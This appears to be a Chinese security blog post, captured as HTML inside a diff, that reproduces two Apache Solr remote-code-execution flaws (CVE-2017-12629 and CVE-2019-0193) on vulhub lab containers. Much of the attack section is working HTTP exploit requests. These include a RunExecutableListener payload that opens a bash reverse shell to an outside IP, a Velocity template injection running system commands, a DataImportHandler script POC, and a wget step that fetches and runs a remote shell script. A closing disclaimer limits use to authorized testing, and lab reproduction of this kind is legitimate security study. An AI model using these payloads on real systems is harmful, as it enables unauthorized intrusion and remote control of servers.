@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<link rel="stylesheet" href="/css/custom.css"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Apache Solr RCE漏洞复现</title><meta charset="utf-8"><meta name="description" content="Ladder@漏洞描述 `Apache Solr`是什么? **Apache Solr** 是一个基于 **Lucene** 的开源搜索平台，专门用于构建`搜索`应用程序。它由 **Java** 开发，提供了比 Lucene 更丰富的查询语言，并且实现了可配置、可扩展的功能，对索引和搜索性能进行了优化。 **核心功能** `Solr `可以独立运行在 **Jetty**、"><meta name="author" content="hzhsec">
+<link rel="canonical" href="https://hzhsec.github.io/list/halo_to_publish/apache-solr-rcelou-dong-fu-xian/"><meta property="og:title" content="Apache Solr RCE漏洞复现" /><meta property="og:description" content="漏洞描述 `Apache Solr`是什么? **Apache Solr** 是一个基于 **Lucene** 的开源搜索平台，专门用于构建`搜索`应用程序。它由 **Java** 开发，提供了比 Lucene 更丰富的查询语言，并且实现了可配置、可扩展的功能，对索引和搜索性能进行了优化。 **核心功能** `Solr `可以独立运行在 **Jetty**、" />
+<meta property="og:type" content="article" /><meta property="og:url" content="https://hzhsec.github.io/list/halo_to_publish/apache-solr-rcelou-dong-fu-xian/" />
+<meta property="article:section" content="list" /><meta property="article:published_time" content="2026-01-09T10:00:00+08:00" /><meta property="article:modified_time" content="2026-01-09T10:00:00+08:00" /><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Apache Solr RCE漏洞复现"/><meta name="twitter:description" content="漏洞描述 `Apache Solr`是什么? **Apache Solr** 是一个基于 **Lucene** 的开源搜索平台，专门用于构建`搜索`应用程序。它由 **Java** 开发，提供了比 Lucene 更丰富的查询语言，并且实现了可配置、可扩展的功能，对索引和搜索性能进行了优化。 **核心功能** `Solr `可以独立运行在 **Jetty**、"/>
+<link rel="icon" href="/static/hzhsec.png" sizes="16x16"><link rel="apple-touch-icon" href="/static/hzhsec.png"><link rel="manifest" href="/static/hzhsec.png">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+<link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" crossorigin="anonymous" media="screen" />
+<link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+<script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script><script>hljs.highlightAll();</script>
+<script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script></head>
+<body><main class="wrapper"><nav class="navigation"><section class="container"><a class="navigation-brand" href="/">主页</a><input type="checkbox" id="menu-toggle" />
+<label class="menu-button float-right" for="menu-toggle"><span></span><span></span><span></span></label><ul class="navigation-list" id="navigation-list">
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="/list/">目录</a></li><li class="navigation-item navigation-menu"><a class="navigation-link" href="/archives/">归档</a></li>
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="/message/">关于</a></li><li class="navigation-item navigation-menu"><a class="navigation-link" href="/categories/">分类</a></li>
+<li class="navigation-item navigation-menu"><a class="navigation-link" href="https://umami-evtq.vercel.app/share/NdRAzdY1AwLB5KF2/hzhsec.github.io">网站统计</a></li><li class="navigation-item menu-separator"><span>|</span></li>
+<li class="navigation-item navigation-social"><a class="navigation-link" href="https://github.com/hzhsec">GitHub</a></li><li class="navigation-item navigation-social"><a class="navigation-link" href="/message/">Mail</a></li></ul></section></nav>
+<div id="content"><article class="blog-single"><header class="blog-title"><h1>Apache Solr RCE漏洞复现</h1></header><p><small>January 9, 2026&nbsp;· 1788 words&nbsp;· 9 min</small><p><details class="blog-toc" open><summary>Contents</summary><nav id="TableOfContents"><ul><li class="toc-item toc-depth-1"><details class="toc-branch toc-depth-1"><summary><a class="toc-link" href="#漏洞描述">漏洞描述</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-2"><a class="toc-link" href="#1cve-2017-12629">1.CVE-2017-12629</a></li><li class="toc-item toc-depth-2"><details class="toc-branch toc-depth-2"><summary><a class="toc-link" href="#2cve-2019-0193">2.CVE-2019-0193</a></summary><div class="toc-children"><ul><li class="toc-item toc-depth-3"><a class="toc-link" href="#漏洞原理">漏洞原理</a></li><li class="toc-item toc-depth-3"><a class="toc-link" href="#影响版本">影响版本</a></li><li class="toc-item toc-depth-3"><a class="toc-link" href="#漏洞复现">漏洞复现</a></li></ul></div></details></li></ul></div></details></li></ul></nav></details><section class="blog-content"><h1 id="漏洞描述">漏洞描述</h1>
+<p><code>Apache Solr</code>是什么?</p>
+<p><strong>Apache Solr</strong> 是一个基于 <strong>Lucene</strong> 的开源搜索平台，专门用于构建<code>搜索</code>应用程序。它由 <strong>Java</strong> 开发，提供了比 Lucene 更丰富的查询语言，并且实现了可配置、可扩展的功能，对索引和搜索性能进行了优化。</p>
+<p><strong>核心功能</strong> <code>Solr </code>可以独立运行在 <strong>Jetty</strong>、<strong>Tomcat</strong> 等 Servlet 容器中。其索引的实现方法非常简单，只需用 <strong>POST</strong> 方法向 Solr 服务器发送一个描述字段及其内容的 <code>XML </code>文档，Solr 根据 XML 文档添加、删除、更新索引。搜索时，只需发送 <code>HTTP GET</code> 请求，然后对 Solr 返回的 <strong>XML</strong>、<strong>JSON</strong> 等格式的查询结果进行解析，组织页面布局。</p>
+<h2 id="1cve-2017-12629">1.CVE-2017-12629</h2>
+<p><strong>漏洞原因</strong>: Apache Solr 是Apache开发的一个开源的基于Lucene的全文搜索服务器。其集合的配置方法（<code>config</code>路径）可以增加和修改监听器，通过<code>RunExecutableListener</code>执行任意系统命令。</p>
+<p><strong>影响版本</strong> Apache Solr &lt; 7.1 Apache Lucene &lt; 7.1</p>
+<p><strong>漏洞复现</strong>:</p>
+<p>漏洞复现环境 准备好<code>docker</code></p>
+<ol><li><strong>靶机环境</strong>（使用 vulhub靶场）：</li></ol>
+<div class="highlight"><pre tabindex="0"><code class="language-bash" data-lang="bash">克隆vulhub仓库
+git clone --depth 1 https://github.com/vulhub/vulhub.git
+到漏洞地址
+cd vulhub/solr/CVE-2017-12629-RCE</code></pre></div>
+<p>拉取镜像</p>
+<div class="highlight"><pre tabindex="0"><code class="language-sh" data-lang="sh">docker-compose up -d </code></pre></div>
+<p>拉取失败的可以使用这个仓库的镜像源配置工具:</p>
+<div class="highlight"><pre tabindex="0"><code class="language-sh" data-lang="sh">git clone https://github.com/hzhsec/docker_proxy.git
+chmod +x *.sh
+./docker-proxy.sh</code></pre></div>
+<p>再拉取</p>
+<div class="highlight"><pre tabindex="0"><code class="language-sh" data-lang="sh">docker-compose up -d </code></pre></div>
+<p>使用docker ps查看镜像是否运行</p>
+<p>访问：http://靶机IP:8983</p>
+<ol><li>检测是否可利用</li></ol>
+<p>core是否有数据,版本是否符合 ![[Pasted image 20260101154023.png]] <code>core selector</code>有数据,版本为<code>7.0.1</code>&lt;7.1</p>
+<ol><li>发送数据包</li></ol>
+<div class="highlight"><pre tabindex="0"><code class="language-http" data-lang="http">POST /solr/demo/config HTTP/1.1
+Host: 192.168.178.141:8983
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 186
+
+{&quot;add-listener&quot;:{&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newliwsten&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;bash&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/10.22.167.164/4444 0&gt;&amp;1&quot;]}}</code></pre></div>
+<p>![[Pasted image 20260101155101.png]] <code>监听</code>添加上了 ![[Pasted image 20260101155027.png]]</p>
+<ol><li>触发监听,执行反弹命令</li></ol>
+<div class="highlight"><pre tabindex="0"><code class="language-http" data-lang="http">POST /solr/demo/update HTTP/1.1
+Host: 192.168.178.141:8983
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: application/json
+Upgrade-Insecure-Requests: 1
+Content-Length: 15
+
+[{&quot;id&quot;:&quot;test&quot;}]</code></pre></div>
+<p>![[Pasted image 20260101155625.png]] <code>成功</code>反弹: ![[Pasted image 20260101155639.png]]</p>
+<h2 id="2cve-2019-0193">2.CVE-2019-0193</h2>
+<h3 id="漏洞原理">漏洞原理</h3>
+<p>当攻击者可以直接访问Solr控制台时，可以通过发送类似<code>/节点名/config</code>的<code>POST</code>请求对该节点的配置文件做更改 Apache Solr默认集成<code>VelocityResponseWriter</code>插件，在该插件的初始化参数中的<code>params.resource.loader.enabled</code>这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模板，默认设置是<code>false</code>。 当设置<code>params.resource.loader.enabled</code>为<code>ture</code>时，将允许用户通过设置请求中的参数来指定相关资源加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
+<h3 id="影响版本">影响版本</h3>
+<p>Apache Solr 5.x - 8.2.0，存在config API版本</p>
+<h3 id="漏洞复现">漏洞复现</h3>
+<p>环境也是<code>vulhub</code>里面的</p>
+<div class="highlight"><pre tabindex="0"><code class="language-sh" data-lang="sh">到漏洞镜像地址
+cd vulhub/solr/CVE-2019-0193
+docker-compose up -d</code></pre></div>
+<ol><li>查看是否满足利用条件</li></ol>
+<p>应用开启了某个<code>core</code>,在<code>core admin</code>查看 ![[Pasted image 20260101162551.png]]</p>
+<ol><li><code>VelocityResponseWriter插件</code>默认的<code>params.resource.loader.enabled</code>是<code>false</code>需要通过<code>post</code>修改设置为<code>true</code></li></ol>
+<div class="highlight"><pre tabindex="0"><code class="language-http" data-lang="http">POST /solr/demo/config HTTP/1.1
+Host: 192.168.178.141:8983
+Content-Type: application/json
+Content-Length: 259
+
+{
+  &quot;update-queryresponsewriter&quot;: {
+    &quot;startup&quot;: &quot;lazy&quot;,
+    &quot;name&quot;: &quot;velocity&quot;,
+    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
+    &quot;template.base.dir&quot;: &quot;&quot;,
+    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
+    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
+  }
+}</code></pre></div>
+<p>![[Pasted image 20260101162901.png]]</p>
+<ol><li>发送命令执行</li></ol>
+<div class="highlight"><pre tabindex="0"><code class="language-http" data-lang="http">GET /solr/demo/select?wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
+Host: 192.168.178.141:8983
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1</code></pre></div>
+<p>![[Pasted image 20260101163105.png]]</p>
+<p><strong>DataImportHandler</strong>模块利用</p>
+<p>此次漏洞出现在 Apache Solr 的 DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的 DIH 配置都可以通过外部请求的 dataConfig 参数来设置。由于 DIH 配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p>
+<p>首先在页面左侧选择 <code>demo</code> 核心，打开 Dataimport 面板，开启右侧 Debug mode，填入以下 POC：</p>
+<div class="highlight"><pre tabindex="0"><code class="language-html" data-lang="html">&lt;dataConfig&gt;
+  &lt;script&gt;&lt;![CDATA[
+          function poc(){ java.lang.Runtime.getRuntime().exec(&quot;touch /tmp/success&quot;);
+          }
+  ]]&gt;&lt;/script&gt;
+  &lt;document&gt;
+    &lt;entity name=&quot;sample&quot;
+            fileName=&quot;.*&quot;
+            baseDir=&quot;/&quot;
+            processor=&quot;FileListEntityProcessor&quot;
+            recursive=&quot;false&quot;
+            transformer=&quot;script:poc&quot; /&gt;
+  &lt;/document&gt;
+&lt;/dataConfig&gt;</code></pre></div>
+<p>![[Pasted image 20260101173157.png]] 点击 "Execute with this Configuration" 会发送以下请求：</p>
+<div class="highlight"><pre tabindex="0"><code class="language-http" data-lang="http">POST /solr/demo/dataimport?_=1708782956647&amp;indent=on&amp;wt=json HTTP/1.1
+Host: your-ip:8983
+Content-Length: 613
+Accept: application/json, text/plain, */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+Content-type: application/x-www-form-urlencoded
+Origin: http://your-ip:8983
+Referer: http://your-ip:8983/solr/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
+Connection: close
+
+command=full-import&amp;verbose=false&amp;clean=false&amp;commit=true&amp;debug=true&amp;core=demo&amp;dataConfig=%3CdataConfig%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22sample%22%0A++++++++++++fileName%3D%22.*%22%0A++++++++++++baseDir%3D%22%2F%22%0A++++++++++++processor%3D%22FileListEntityProcessor%22%0A++++++++++++recursive%3D%22false%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&amp;name=dataimport
+</code></pre></div>
+<p>进入docker查看是否有文件产生</p>
+<div class="highlight"><pre tabindex="0"><code class="language-sh" data-lang="sh">docker exec -it id /bin/bash
+ls /tmp/success</code></pre></div>
+<p>![[Pasted image 20260101173318.png]]</p>
+<p>尝试<code>rce</code>反弹shell,可能是编码问题,一直执行不了直接反弹命令 发现<code>wget</code>有反应,使用<code>wget</code>下载带有反弹命令的sh脚本 执行</p>
+<div class="highlight"><pre tabindex="0"><code class="language-sh" data-lang="sh">wget http://xxx/1.sh
+chmod +x 1.sh
+bash 1.sh</code></pre></div>
+<p>成功反弹 ![[Pasted image 20260101173558.png]]</p>
+<p><strong>免责声明</strong></p>
+<p>本文档所包含的漏洞复现方法、技术细节及利用代码，<strong>仅限用于授权的安全测试、教育学习与研究目的</strong>。 <strong>严禁</strong>在未获得明确授权的情况下，对任何系统进行测试或攻击。任何不当使用所导致的法律责任及后果，均由使用者自行承担。 作者与文档提供者不承担任何因滥用本文档信息而产生的直接或间接责任。请遵守您所在地的法律法规，并始终践行负责任的网络安全实践。</p></section><div class="paginator"><a class="prev" href="https://hzhsec.github.io/list/halo_to_publish/apache_shiro-cve-2016-4437-fan-xu-lie-hua-lou-dong-fu-xian/"><small>← 上一篇</small><span>apache_shiro (CVE-2016-4437)反序列化漏洞复现</span></a><a class="next" href="https://hzhsec.github.io/list/halo_to_publish/advanced-xss-mxss-uxss-svg-pdf-flash-exploitation/"><small>下一篇 →</small><span>XSS 进阶实战：MXSS、UXSS 以及 SVG/PDF/Flash 等非传统载体解析</span></a></div></article></div><footer class="footer"><p>&copy; 2026 <a href="https://hzhsec.github.io/">Hzhsec home</a> Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a> <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a></p></footer>
+<a href="#top" class="top-link" id="top-link" accesskey="g">Top</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};</script>
+<script>document.querySelectorAll('pre > code').forEach((codeblock)=>{const copybutton=document.createElement('button');copybutton.classList.add('copy-code');copybutton.innerHTML='Copy';function done(){copybutton.innerHTML='Copied';setTimeout(()=>{copybutton.innerHTML='Copy';},2000);}copybutton.addEventListener('click',()=>{if('clipboard' in navigator){navigator.clipboard.writeText(codeblock.textContent);done();return;}const range=document.createRange();range.selectNodeContents(codeblock);const selection=window.getSelection();selection.removeAllRanges();selection.addRange(range);try{document.execCommand('copy');done();}catch(e){}selection.removeRange(range);});codeblock.parentNode.appendChild(copybutton);});</script></main></body>
+<script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" crossorigin="anonymous" defer></script></html>
